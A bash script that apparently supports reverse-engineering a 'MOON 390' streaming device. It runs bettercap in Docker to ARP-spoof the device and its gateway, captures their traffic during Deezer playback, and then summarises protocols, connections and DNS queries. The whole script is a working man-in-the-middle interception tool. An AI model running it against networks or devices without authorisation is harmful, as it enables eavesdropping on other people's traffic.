#!/usr/bin/env bash
# ARP spoof capture: intercept MOON 390 ↔ gateway traffic
# Usage: ./arp_capture.sh [duration_seconds]
# Default: 60s

set -euo pipefail

DURATION="${1:-60}"
OUTDIR="/tmp/moon_captures"
mkdir -p "$OUTDIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PCAP="$OUTDIR/moon_${TIMESTAMP}.pcap"

MOON_IP="192.168.0.172"
MOON_MAC="10:c3:7b:4c:7c:a2"
GW_IP="192.168.0.254"
GW_MAC="14:0c:76:97:46:a1"
IFACE="eno1"

echo "=== ARP Spoof + Capture ==="
echo "MOON:    $MOON_IP ($MOON_MAC)"
echo "Gateway: $GW_IP ($GW_MAC)"
echo "Attacker: 192.168.0.44 ($IFACE)"
echo "Duration: ${DURATION}s"
echo "Output:   $PCAP"
echo ""
echo "⚠️  Perform Deezer actions in the MiND app NOW"
echo "   (browse playlist, start playback, skip, pause)"
echo ""

# Generate bettercap caplet
CAPLET="/tmp/moon_caplet_${TIMESTAMP}.cap"
cat > "$CAPLET" << EOF
# Moon ARP spoof caplet
set arp.spoof.targets $MOON_IP,$GW_IP
set arp.spoof.internal true
set net.sniff.output $PCAP
set net.sniff.local false
set net.sniff.filter "host $MOON_IP or host $GW_IP"
set net.sniff.verbose false

# Start spoofing + sniffing
arp.spoof on
net.sniff on

# Wait
sleep $DURATION

# Cleanup
net.sniff off
arp.spoof off
sleep 2
exit
EOF

# Run single bettercap instance
docker run --rm --name moon_spoof \
  --net=host --cap-add=NET_RAW --cap-add=NET_ADMIN \
  -v /tmp:/tmp \
  bettercap/bettercap -caplet "$CAPLET" 2>&1 | grep -vE '^(\[|$)'

# Restore clean ARP
echo ""
echo "Sending cleanup ARP..."
docker run --rm --net=host --cap-add=NET_RAW --cap-add=NET_ADMIN \
  bettercap/bettercap -eval "
    set arp.spoof.targets $MOON_IP,$GW_IP;
    arp.spoof off;
    sleep 2;
    exit;
  " > /dev/null 2>&1 || true

# Analysis
echo ""
echo "=== Capture Summary ==="
SIZE=$(du -h "$PCAP" | cut -f1)
echo "File: $PCAP ($SIZE)"

docker run --rm -v /tmp:/tmp alpine:latest sh -c "
  apk add -q tcpdump 2>/dev/null >/dev/null;
  PKTS=\$(tcpdump -r $PCAP 2>/dev/null | wc -l);
  echo \"Packets: \$PKTS\";
  echo '';
  echo '--- Protocols ---';
  tcpdump -r $PCAP -nn -q 2>/dev/null | awk -F' ' '{for(i=1;i<=NF;i++) if(\$i~/^(UDP|TCP|ICMP|ARP)/){print \$i; next}}' | sort | uniq -c | sort -rn;
  echo '';
  echo '--- Connections (SYN) ---';
  tcpdump -r $PCAP -nn 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0' 2>/dev/null;
  echo '';
  echo '--- DNS queries ---';
  tcpdump -r $PCAP -nn 'udp port 53' 2>/dev/null | head -20;
"
